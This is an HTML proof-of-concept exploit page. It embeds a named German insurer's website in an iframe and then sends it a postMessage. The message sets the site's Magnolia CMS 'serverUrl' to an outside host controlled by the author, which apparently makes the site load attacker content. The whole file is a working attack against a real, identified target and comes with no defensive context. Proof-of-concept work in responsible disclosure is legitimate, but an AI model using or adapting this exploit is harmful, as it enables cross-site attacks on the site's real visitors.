<!doctype html>
<html>
<head><meta charset="utf-8"><title>PoC</title></head>
<body>
<iframe id="f" src="https://www.condor-versicherungen.de/?mgnlPreview=false"
        width="1280" height="800" style="border:none"
        sandbox="allow-scripts allow-same-origin allow-forms"></iframe>
<script>
document.getElementById("f").onload = function() {
  setTimeout(function() {
    // base = directory where poc.html lives, e.g. https://trusthoodies.github.io/condor-poc
    var base = location.href.substring(0, location.href.lastIndexOf("/"));
    document.getElementById("f").contentWindow.postMessage(
      JSON.stringify({ action: "updateState", serverUrl: base + "/.magnolia/x" }),
      "*"
    );
  }, 2500);
};
</script>
</body>
</html>
